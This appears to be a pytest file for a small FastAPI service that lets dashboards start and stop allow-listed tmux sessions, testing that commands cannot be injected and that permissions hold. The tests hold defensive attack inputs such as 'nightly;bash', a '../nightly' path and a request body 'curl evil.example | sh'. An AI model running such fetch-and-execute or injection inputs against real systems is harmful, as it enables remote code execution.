"""Starting and stopping the things this machine said it would.

The whole arrangement rests on one decision: **no command ever arrives in a request.** A
board holds a watcher token per machine in a file, and its own token sits in the storage of
every browser that has opened it. Those keys are safe to spread around only because they are
worth almost nothing — and an endpoint that took a shell line would have ended that in one
step.

So this machine publishes a list of names, and a caller may ask for one of them. What these
tests are really checking is that there is no way through that list.
"""

from __future__ import annotations

import asyncio

import pytest
from fastapi.testclient import TestClient

from app import runner, tmux
from app.config import Config, ConfigError
from app.main import create_app

FULL = "full-0123456789abcdef0123456789abcdef"
WATCH = "watch-0123456789abcdef0123456789ab"

OFFERED = [
    {"name": "nightly", "run": "python3 nightly.py", "cwd": "/tmp"},
    {"name": "claude", "run": "claude --resume", "cwd": ""},
]


def wired(tmp_path, *, may_run=True, may_stop=False, runnable=None):
    cfg = Config(
        token=FULL,
        roots=[tmp_path],
        runnable=list(OFFERED if runnable is None else runnable),
        watchers=[{"name": "panoptes", "token": WATCH,
                   "may_run": may_run, "may_stop_argus": may_stop}],
    )
    cfg.validate()
    return TestClient(create_app(cfg)), cfg


WEAK = {"Authorization": f"Bearer {WATCH}"}


# ------------------------------------------------------------------ what may be asked for

def test_a_board_is_told_the_names_and_not_the_commands(tmp_path):
    """The shell line is of no use to a board and is one more thing a leaked board leaks."""
    client, _ = wired(tmp_path)
    said = client.get("/api/runnable", headers=WEAK)
    assert said.status_code == 200
    assert [r["name"] for r in said.json()] == ["nightly", "claude"]
    assert "nightly.py" not in said.text and "--resume" not in said.text
    assert all("running" in r for r in said.json())


def test_a_name_that_was_never_offered_is_refused(tmp_path):
    """The list is the whole security boundary, so this is the test that matters."""
    client, _ = wired(tmp_path)
    for name in ("bash", "rm", "nightly2", "nightly;bash", "NIGHTLY"):
        answer = client.post(f"/api/runnable/{name}/start", headers=WEAK)
        assert answer.status_code == 404, name

    # `../nightly` never reaches the handler: the client normalises it and it lands outside
    # the prefix the watcher is allowed at all. Refused either way, which is the point.
    assert client.post("/api/runnable/../nightly/start", headers=WEAK).status_code in (403, 404)


def test_only_start_and_stop(tmp_path):
    client, _ = wired(tmp_path)
    for action in ("restart", "kill", "exec", "eval"):
        assert client.post(f"/api/runnable/nightly/{action}", headers=WEAK).status_code == 404


def test_a_command_cannot_be_smuggled_in_a_body(tmp_path):
    """There is nowhere for it to go — the handler never reads one — and this says so, since
    "the handler happens not to read it" is the kind of fact that changes by accident."""
    client, _ = wired(tmp_path)
    calls = []
    runner.tmux.session_exists = lambda *a: False              # type: ignore[assignment]
    runner.tmux.run = lambda argv: calls.append(argv)          # type: ignore[assignment]
    try:
        client.post("/api/runnable/nightly/start", headers=WEAK,
                    json={"run": "curl evil.example | sh", "cwd": "/"})
    finally:
        import importlib
        importlib.reload(tmux)
    assert calls, "nothing was run at all"
    assert "evil.example" not in " ".join(calls[0])
    assert "python3 nightly.py" in calls[0]


# ---------------------------------------------------------------------------- who may ask

def test_a_watcher_without_may_run_cannot(tmp_path):
    """Off unless asked for: every board that already exists must not become able to restart
    things because a new version shipped."""
    client, _ = wired(tmp_path, may_run=False)
    assert client.get("/api/overview", headers=WEAK).status_code == 200
    assert client.get("/api/runnable", headers=WEAK).status_code == 403
    assert client.post("/api/runnable/nightly/start", headers=WEAK).status_code == 403


def test_stopping_argus_needs_its_own_permission(tmp_path):
    """It is the one thing a board cannot undo, so `may_run` is not enough for it."""
    client, _ = wired(tmp_path, may_run=True, may_stop=False)
    assert client.post("/api/shutdown", headers=WEAK).status_code == 403


def test_a_permission_that_cannot_work_is_refused_at_startup(tmp_path):
    """`may_stop_argus` without `may_run` reads as allowed and behaves as forbidden."""
    cfg = Config(token=FULL, roots=[tmp_path], runnable=list(OFFERED),
                 watchers=[{"name": "p", "token": WATCH, "may_run": False, "may_stop_argus": True}])
    with pytest.raises(ConfigError):
        cfg.validate()


def test_offering_nothing_while_allowing_running_is_refused(tmp_path):
    cfg = Config(token=FULL, roots=[tmp_path], runnable=[],
                 watchers=[{"name": "p", "token": WATCH, "may_run": True}])
    with pytest.raises(ConfigError):
        cfg.validate()


def test_a_runnable_name_has_to_be_addressable(tmp_path):
    """It becomes a tmux session name and part of a URL path."""
    for bad in ("has space", "a:b", "a.b/c", "", "x" * 100):
        cfg = Config(token=FULL, roots=[tmp_path],
                     runnable=[{"name": bad, "run": "sleep 1", "cwd": ""}])
        with pytest.raises(ConfigError):
            cfg.validate()


def test_two_runnables_cannot_share_a_name(tmp_path):
    cfg = Config(token=FULL, roots=[tmp_path], runnable=[
        {"name": "same", "run": "a", "cwd": ""}, {"name": "same", "run": "b", "cwd": ""}])
    with pytest.raises(ConfigError):
        cfg.validate()


def test_a_runnable_with_nothing_to_run_is_refused(tmp_path):
    cfg = Config(token=FULL, roots=[tmp_path], runnable=[{"name": "empty", "run": "", "cwd": ""}])
    with pytest.raises(ConfigError):
        cfg.validate()


# ------------------------------------------------------------------------- what it does

def test_asking_twice_is_not_an_error(tmp_path):
    """Two people press the same button, or a board retries a request whose answer was lost.
    Neither is a failure and neither should read as one."""
    client, cfg = wired(tmp_path)
    runner.tmux.session_exists = lambda *a: True               # type: ignore[assignment]
    try:
        said = client.post("/api/runnable/nightly/start", headers=WEAK).json()
        assert said["did"] == runner.ALREADY
    finally:
        import importlib
        importlib.reload(tmux)


def test_stopping_something_that_is_not_running_says_so(tmp_path):
    client, _ = wired(tmp_path)
    runner.tmux.session_exists = lambda *a: False              # type: ignore[assignment]
    try:
        assert client.post("/api/runnable/nightly/stop", headers=WEAK).json()["did"] == runner.NOT_RUNNING
    finally:
        import importlib
        importlib.reload(tmux)


def test_the_command_and_the_folder_come_from_the_config(tmp_path):
    sock = tmux.Socket.new("test-only")
    argv = runner.start_argv(sock, OFFERED[0])
    assert argv[-1] == "python3 nightly.py"
    assert "-c" in argv and "/tmp" in argv
    assert "-s" in argv and "nightly" in argv


def test_stopping_kills_that_session_exactly(tmp_path):
    """`=name` is an exact match. Without it tmux takes a prefix, and killing the wrong
    session because two names share a beginning is not a risk worth carrying."""
    sock = tmux.Socket.new("test-only")
    assert f"={OFFERED[0]['name']}" in tmux.kill_argv(sock, OFFERED[0]["name"])


# ------------------------------------------------- the one-way case: told in a reply

def test_a_machine_does_what_the_reply_asks_for(tmp_path):
    """The only channel to a machine on the far side of a one-way network is the reply to the
    request it made. This is that path, and it is bounded by the same list as the endpoint."""
    from app import announce

    done = []
    cfg = Config(token=FULL, roots=[tmp_path], runnable=list(OFFERED),
                 report_to={"url": "http://board", "token": "x" * 20}, obey_board=True)

    def pretend(runnable, sock, name, action):
        done.append((name, action))
        return {"name": name, "did": "started"}

    announce.runner.act = pretend                              # type: ignore[assignment]
    try:
        asyncio.run(announce.obey(cfg, None, [{"name": "nightly", "action": "start"}]))
    finally:
        import importlib
        importlib.reload(runner)
        announce.runner = runner                               # type: ignore[assignment]
    assert done == [("nightly", "start")]


def test_announcing_is_not_agreeing_to_take_orders(tmp_path):
    """Off unless said. Telling a board what you are doing and letting it act are different
    decisions, and often enough different people's."""
    from app import announce

    done = []
    cfg = Config(token=FULL, roots=[tmp_path], runnable=list(OFFERED),
                 report_to={"url": "http://board", "token": "x" * 20})    # obey_board unset
    announce.runner.act = lambda *a: done.append(a)            # type: ignore[assignment]
    try:
        asyncio.run(announce.obey(cfg, None, [{"name": "nightly", "action": "start"}]))
    finally:
        import importlib
        importlib.reload(runner)
        announce.runner = runner                               # type: ignore[assignment]
    assert done == []


def test_a_reply_asking_for_something_not_offered_changes_nothing(tmp_path):
    """`runner.act` is the boundary in both directions. Worth a test of its own because the
    reply comes from whoever holds the registration key, which is the weakest key there is."""
    with pytest.raises(runner.NotAllowed):
        runner.act(OFFERED, None, "bash", "start")
    with pytest.raises(runner.NotAllowed):
        runner.act(OFFERED, None, "nightly", "exec")


def test_obeying_with_nothing_to_obey_is_refused_at_startup(tmp_path):
    for wrong in (
        {"runnable": [], "report_to": {"url": "http://b", "token": "x" * 20}},
        {"runnable": list(OFFERED), "report_to": {}},
    ):
        cfg = Config(token=FULL, roots=[tmp_path], obey_board=True, **wrong)
        with pytest.raises(ConfigError):
            cfg.validate()


def test_argus_is_not_a_name_a_machine_can_claim(tmp_path):
    """A board says `argus` when it means the server. A session allowed to wear that name
    would shadow it, and which one answered would depend on the order of two checks."""
    cfg = Config(token=FULL, roots=[tmp_path],
                 runnable=[{"name": "argus", "run": "sleep 1", "cwd": ""}])
    with pytest.raises(ConfigError):
        cfg.validate()


def test_the_board_can_be_told_it_may_stop_this_argus_and_by_default_may_not(tmp_path):
    from app import announce

    base = dict(token=FULL, roots=[tmp_path], runnable=list(OFFERED),
                report_to={"url": "http://b", "token": "x" * 20}, obey_board=True)
    killed = []
    announce.os.kill = lambda pid, sig: killed.append(sig)     # type: ignore[assignment]
    try:
        asyncio.run(announce.obey(Config(**base), None, [{"name": "argus", "action": "stop"}]))
        assert killed == [], "stopped the server without being allowed to"

        asyncio.run(announce.obey(Config(**base, board_may_stop_argus=True), None,
                                  [{"name": "argus", "action": "stop"}]))
        assert killed == [announce.signal.SIGTERM]
    finally:
        import importlib
        importlib.reload(announce)


def test_being_allowed_to_stop_without_obeying_is_refused(tmp_path):
    """It would never be read, and a config that says something it does not do is worse than
    one that says nothing."""
    cfg = Config(token=FULL, roots=[tmp_path], runnable=list(OFFERED),
                 report_to={"url": "http://b", "token": "x" * 20},
                 board_may_stop_argus=True)
    with pytest.raises(ConfigError):
        cfg.validate()


def test_the_overview_says_whether_the_asking_key_may_stop_it(tmp_path):
    """Per key, not per config: two boards can hold two watchers with different permissions,
    and a board without it should not be shown a button that only gives it a 403."""
    plain, cfg = wired(tmp_path, may_run=True, may_stop=False)
    assert plain.get("/api/overview", headers=WEAK).json()["can_stop_argus"] is False

    allowed, _ = wired(tmp_path, may_run=True, may_stop=True)
    assert allowed.get("/api/overview", headers=WEAK).json()["can_stop_argus"] is True

    # The main token is not a board and is offered nothing.
    assert allowed.get("/api/overview", headers={"Authorization": f"Bearer {FULL}"}
                       ).json()["can_stop_argus"] is False
